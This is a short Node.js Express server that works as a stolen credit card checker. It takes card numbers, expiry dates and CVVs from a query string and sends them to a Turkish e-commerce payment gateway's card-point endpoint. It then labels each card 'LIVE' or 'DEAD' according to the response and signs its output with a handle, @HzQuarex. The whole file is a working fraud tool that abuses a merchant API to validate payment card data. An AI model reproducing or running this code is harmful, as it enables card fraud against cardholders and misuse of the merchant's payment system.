const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());

app.get('/proxy', async (req, res) => {
  const card = req.query.card;
  if (!card) {
    return res.send('❌ DEAD => No card provided');
  }

  const [cc, month, year, cvv] = card.split('|');
  const lid = '45542'; // sabit değer

  const apiURL = `https://checkout-gw.prod.ticimax.net/payments/9/card-point?cc=${cc}&month=${month}&year=${year}&cvv=${cvv}&lid=${lid}`;

  try {
    const response = await fetch(apiURL);
    const data = await response.json();

    if (data?.pointAmount) {
      res.send(`✅ LIVE ➜ ${card} ➜ ✅ Approved | MAXIPUAN ${data.pointAmount} TL @HzQuarex`);
    } else {
      res.send(`❌ DEAD => ${card}`);
    }
  } catch (error) {
    res.send(`❌ DEAD => ${card} => API bağlantı hatası`);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
